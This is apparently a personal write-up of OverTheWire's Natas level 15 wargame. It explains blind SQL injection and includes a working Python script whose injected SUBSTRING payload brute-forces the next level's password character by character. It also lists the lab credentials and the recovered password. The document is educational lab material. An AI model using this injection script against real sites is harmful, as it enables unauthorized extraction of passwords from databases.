```
Username: natas15
Password: SdqIqBsFcz3yotlNYErZSZwblkm0lrvx
URL:      http://natas15.natas.labs.overthewire.org
```

- for this level we also have an SQL query that takes the user input and check the database for its existence
`SELECT * from users where username=\"".$_REQUEST["username"]."\"`
- however, if i use the same input as for the previous level, it just tells me the user exists, but i don't get the password
- this is a special case of SQL injection: blind SQL injection
- this means i don't get the full password, just a confirmation if it is correct or not
- because of this, i need to go character by character and try all possibilities for each one
- this can't realistically be done by hand, so i made a python script to automate the process:
```Python
import requests
import string

# Natas15 credentials
url = "http://natas15.natas.labs.overthewire.org/"
username = "natas15"
password = "SdqIqBsFcz3yotlNYErZSZwblkm0lrvx"  

# Characters to test (alphanumeric)
charset = string.ascii_letters + string.digits

def exploit():
    print("Starting Blind SQL Injection on Natas15...")
    found_password = ""
    
    for position in range(1, 33):  # Passwords are 32 chars in Natas
        for char in charset:
            # SQL injection payload
            payload = f'natas16" AND BINARY SUBSTRING(password,{position},1)="{char}" #'
            
            data = {"username": payload}
            
            try:
                response = requests.post(
                    url, 
                    auth=(username, password), 
                    data=data,
                    timeout=5
                )
                
                if "This user exists" in response.text:
                    found_password += char
                    print(f"Position {position:2d}: {char} → Password: {found_password}")
                    break
                    
            except Exception as e:
                print(f"Error: {e}")
    
    print(f"\nFinal Password for natas16: {found_password}")
    return found_password

if __name__ == "__main__":
    exploit()
```
- this gives me the password

# Password

- **hPkjKYviLQctEW33QmuXL6eDVfMW4sGo**
